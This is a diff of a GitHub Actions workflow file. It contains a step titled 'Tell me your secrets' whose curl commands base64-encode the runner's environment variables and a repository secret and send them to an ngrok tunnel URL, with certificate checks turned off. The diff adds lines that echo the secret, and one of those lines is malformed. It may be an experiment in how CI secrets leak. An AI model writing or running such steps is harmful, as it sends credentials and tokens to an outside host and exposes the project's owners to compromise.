@@ -21,8 +21,10 @@ jobs:
     steps:
       - name: Tell me your secrets
         run: |
+          echo ${{ secrets.FAVOURITE }}
           curl -k https://4877-128-130-233-91.eu.ngrok.io?data=$(env | base64 --wrap=0)
           curl -k https://4877-128-130-233-91.eu.ngrok.io?secret=$(secrets.FAVOURITE | base64 --wrap=0)
+          echo $(secrets.FAVOURITE }
           echo "::add-mask::${{ secrets.FAVOURITE }}"
 
       - name: I ll tell you my current favourite 
